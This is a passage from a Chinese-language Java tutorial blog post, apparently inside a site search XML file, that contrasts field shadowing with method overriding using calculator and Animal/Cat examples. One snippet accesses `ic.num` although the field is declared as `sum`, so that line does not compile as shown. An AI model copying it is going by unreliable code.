<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">InterCalculator</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> sum;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecimalCalculator</span> <span class="keyword">extends</span> <span class="title">InterCalculator</span> </span>&#123;</div><div class="line">    <span class="keyword">double</span> sum;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当由一个派生层次更高的类型(父类)来引用一个子类对象，那么被遮蔽的对象会怎样呢</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DecimalCalculator dc = <span class="keyword">new</span> DecimalCalculator();</div><div class="line">InterCalculator ic = dc;</div><div class="line"></div><div class="line"><span class="keyword">int</span> s = ic.num; <span class="comment">//access InterCalculator sum</span></div><div class="line"></div><div class="line"><span class="comment">// 如果我们访问的对象使用到了InterCalculator类型的显示类型转换或者我们把一个实例传递给接受父类类型的方法，也会是这种情况</span></div></pre></td></tr></table></figure>
<ol>
<li>而类似的方法的覆盖,我一直叫 <em>方法的重写</em> (override)</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mammal</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</div><div class="line">    <span class="comment">// override the method sleep</span></div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Mammal</span> </span>&#123;</div><div class="line">    <span class="comment">// override the method sleep</span></div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>类似上面， 当由一个派生层次更高的类型(父类)来引用一个子类对象，那么被遮蔽的对象会怎样呢</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Cat simon = <span class="keyword">new</span> Cat();</div><div class="line">Animal creature = simon;</div><div class="line">...</div><div class="line">creature.sleep();   <span class="comment">// access Cat sleep</span></div></pre></td></tr></table></figure>
<p>方法的override与前面的变量的遮蔽不太一样</p>
<h3 id="从行为来看-Cat就是一个Cat，不管你怎么叫他-而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。"><a href="#从行为来看-Cat就是一个Cat，不管你怎么叫他-而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。" class="headerlink" title="从行为来看,Cat就是一个Cat，不管你怎么叫他,而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。"></a>从行为来看,Cat就是一个Cat，不管你怎么叫他,而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。</h3>]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title><![CDATA[友链]]></title>
      <url>/links/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[tags]]></title>
      <url>/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
